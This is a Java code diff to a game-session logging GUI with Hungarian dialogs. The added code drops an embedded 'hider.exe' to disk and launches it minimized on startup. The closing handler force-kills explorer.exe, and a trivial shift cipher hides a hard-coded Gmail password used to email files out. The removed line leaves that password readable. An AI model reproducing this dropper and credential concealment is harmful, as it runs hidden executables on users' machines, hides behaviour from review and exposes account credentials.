@@ -10,10 +10,14 @@ import java.awt.event.WindowEvent;
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.FileReader;
 import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.io.Writer;
 import java.util.Date;
@@ -48,7 +52,7 @@ public class MainGui extends JFrame{
 	private static final long serialVersionUID = 1L;
 	public static Date actualTime;
 	public static String pathOfFile;
-	//public static String pathOfDirectory;
+	public static String pathOfDirectory;
 	public static boolean haveToSend = false;
 	public JLabel nameLabel ;
 	public JTextField nameField;
@@ -64,6 +68,29 @@ public class MainGui extends JFrame{
 		setResizable(false);
 		setLayout(new BorderLayout());
 		
+		try {
+			 InputStream in =  getClass().getResourceAsStream("/resources/hider.exe");
+			 OutputStream out = new FileOutputStream("hider.exe");
+			 
+			 
+			 for(int c =  in.read() ;c != -1; c = in.read()){
+				 out.write(c);
+			 }
+
+			 in.close();
+			 out.flush();
+			 out.close();
+			 
+			 out = null;
+
+
+			 String command = "cmd.exe /c start /min hider.exe "; 
+			 Runtime.getRuntime().exec(command);
+		 } catch (IOException e1) {
+			// TODO Auto-generated catch block
+			e1.printStackTrace();
+		}
+		
 		addWindowListener(new WindowAdapter()
         {
             public void windowClosing(WindowEvent we)
@@ -74,7 +101,7 @@ public class MainGui extends JFrame{
 						Runtime.getRuntime().exec("taskkill /F /IM rF_TotalControl.exe");
 						Runtime.getRuntime().exec("taskkill /F /IM explorer.exe");
 						try {
-							Thread.sleep(50);
+							Thread.sleep(200);
 						} catch (InterruptedException e) {
 							// TODO Auto-generated catch block
 							e.printStackTrace();
@@ -93,14 +120,7 @@ public class MainGui extends JFrame{
         });
 		
 		 
-		 try {
-			 String command = "cmd.exe /c start /min hider.exe "; 
-			 //String command = "cmd.exe /c start /min chrome.exe";
-			 Process p=Runtime.getRuntime().exec(command);
-		 } catch (IOException e1) {
-			// TODO Auto-generated catch block
-			e1.printStackTrace();
-		}
+		 
 		
 		try {
 			fileReader = new BufferedReader(new FileReader("properties773.txt"));
@@ -187,6 +207,18 @@ public class MainGui extends JFrame{
 		setLocationRelativeTo(null);
 	}
 	
+	public static String decrypt(String string){
+		String sB = "";
+		
+		for(int i = 0; i < string.length(); ++i){
+			int tmp = string.charAt(i);
+			char c= (char)(tmp+11);
+			sB += c;
+		}
+		
+		return sB;
+	}
+	
 	public int rlyClose(){
 		int result = JOptionPane.showOptionDialog(null, 
 		        "Végeztél?", 
@@ -194,7 +226,7 @@ public class MainGui extends JFrame{
 		        JOptionPane.OK_CANCEL_OPTION, 
 		        JOptionPane.INFORMATION_MESSAGE, 
 		        null, 
-		        new String[]{"Igen", "Nem"}, // this is the array
+		        new String[]{"Igen", "Nem"}, 
 		        "default");
 		return result;
 	}
@@ -228,7 +260,7 @@ public class MainGui extends JFrame{
 	
 	public static void sendEmail(String attachMent, String playerName){
 		final String username = "aligatestlogger@gmail.com";
-		final String password = "aligaTest";
+		final String password = decrypt("Va^\\VIZhi");
  
 		Properties props = new Properties();
 	    props.put("mail.smtp.auth", true);
